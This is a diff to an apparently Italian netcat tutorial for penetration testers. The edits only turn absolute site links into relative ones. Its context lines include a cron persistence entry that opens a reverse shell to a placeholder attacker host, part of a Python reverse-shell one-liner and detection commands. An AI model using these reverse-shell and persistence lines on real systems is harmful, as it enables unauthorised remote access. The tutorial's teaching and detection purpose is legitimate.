@@ -59,7 +59,7 @@ sudo yum install nc
 sudo yum install nmap-ncat
 ```
 
-**Windows:** non è incluso nativamente. Va scaricato Ncat dalla suite [Nmap](https://hackita.it/articoli/nmap/) ufficiale.
+**Windows:** non è incluso nativamente. Va scaricato Ncat dalla suite [Nmap](/articoli/nmap/) ufficiale.
 
 ### Perché la variante conta
 
@@ -141,7 +141,7 @@ Connection to 192.168.1.100 22 port [tcp/ssh] succeeded!
 Connection to 192.168.1.100 80 port [tcp/http] succeeded!
 ```
 
-Netcat va bene per verifiche puntuali, ma per uno scan completo con service/OS detection e script NSE resta di riferimento **[Nmap](https://hackita.it/articoli/nmap/)**.
+Netcat va bene per verifiche puntuali, ma per uno scan completo con service/OS detection e script NSE resta di riferimento **[Nmap](/articoli/nmap/)**.
 
 ### Test Connettività TCP/UDP
 
@@ -207,7 +207,7 @@ nc host_a_ip 5555
 nc -l -p 8080 | nc remote_server 80
 ```
 
-Utile per test rapidi, ma per un tunneling vero e proprio (SOCKS, più porte, resilienza) uno strumento dedicato come [chisel](https://hackita.it/articoli/chisel/) è più adatto di un relay netcat fatto a mano.
+Utile per test rapidi, ma per un tunneling vero e proprio (SOCKS, più porte, resilienza) uno strumento dedicato come [chisel](/articoli/chisel/) è più adatto di un relay netcat fatto a mano.
 
 ## Shell Remote
 
@@ -252,11 +252,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 Altre one-liner in PHP, Perl, Ruby, Java sono raccolte nella storica [reverse shell cheat sheet di PentestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
 
-Dopo l'accesso iniziale, il passo successivo è post-exploitation e lateral movement — territorio di **[Metasploit](https://hackita.it/articoli/metasploit/)**.
+Dopo l'accesso iniziale, il passo successivo è post-exploitation e lateral movement — territorio di **[Metasploit](/articoli/metasploit/)**.
 
 ### Persistenza e Upgrade Shell
 
-[Cron job](https://hackita.it/articoli/crontab/) (solo in lab autorizzati — è un IoC facilmente rilevabile):
+[Cron job](/articoli/crontab/) (solo in lab autorizzati — è un IoC facilmente rilevabile):
 
 ```bash
 */5 * * * * nc attacker_ip 4444 -e /bin/bash
@@ -299,7 +299,7 @@ netstat -antp | grep nc
 lsof -i -P -n | grep LISTEN
 ```
 
-Per capire cosa sta passando davvero su quella connessione (payload, pattern, riuso della stessa porta), la cattura con [Wireshark](https://hackita.it/articoli/wireshark/) resta il passo successivo naturale rispetto al solo controllo dei processi attivi.
+Per capire cosa sta passando davvero su quella connessione (payload, pattern, riuso della stessa porta), la cattura con [Wireshark](/articoli/wireshark/) resta il passo successivo naturale rispetto al solo controllo dei processi attivi.
 
 **Indicatori di compromissione:**
 
